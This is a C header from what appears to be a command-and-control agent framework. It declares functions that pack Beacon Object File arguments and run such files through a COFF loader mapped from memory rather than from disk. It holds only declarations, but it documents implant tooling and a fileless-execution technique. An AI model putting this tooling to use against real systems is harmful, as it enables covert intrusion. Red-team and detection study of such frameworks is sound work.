#ifndef C2_BOF_H
#define C2_BOF_H

/*
 * c2_bof.h — Linux BOF (Beacon Object File) execution.
 *
 * The loader itself is not linked into the agent: it is the `coffloader_linux`
 * dependency module (coffloader_linux.so), the Linux counterpart of the Windows
 * COFFLoader DLL. c2_bof_run maps the loader image from memory (a memfd, never
 * disk), dlopens it through dynload, calls its `bof_run` export with the object
 * and packed arguments, and closes it again.
 *
 * The Go agent maps the same dependency with memmod (core/lib/coffloader), so
 * both agents execute BOFs through identical loader code.
 */

#include "c2_common.h"

#ifdef __cplusplus
extern "C" {
#endif

/*
 * Pack BOF arguments into the Beacon wire format consumed by the loader:
 *
 *   uint32(body_len) || value...
 *
 * Each `args[i]` is a prefixed token, mirroring Go's PackCoffArgs/packLinuxArgs:
 *   i<int32>   s<int16>   z<string>   Z<wide string>   b<hex bytes>
 *
 * Returns C2_OK and sets *out_len, or C2_ERR_ARG/C2_ERR_NOMEM.
 */
c2_status c2_bof_pack_args(const c2_str *args, size_t argc, uint8_t *out,
                           size_t out_cap, size_t *out_len);

/*
 * Run a Linux relocatable BOF. `loader_so` is the coffloader_linux.so image,
 * `bof` the relocatable object, `export_name` the entry (NULL/"" means "go"),
 * and `args`/`args_len` the packed argument blob (may be NULL/0).
 *
 * On C2_OK *out is a NUL-terminated malloc'd string (possibly empty) that the
 * caller frees with free(); it is never NULL on C2_OK. On failure *out is set
 * to a malloc'd copy of the loader's error message when one is available
 * (otherwise NULL), and the caller should still free it.
 */
c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
                     const uint8_t *bof, size_t bof_len,
                     const char *export_name, const uint8_t *args,
                     size_t args_len, char **out);

#ifdef __cplusplus
}
#endif

#endif /* C2_BOF_H */
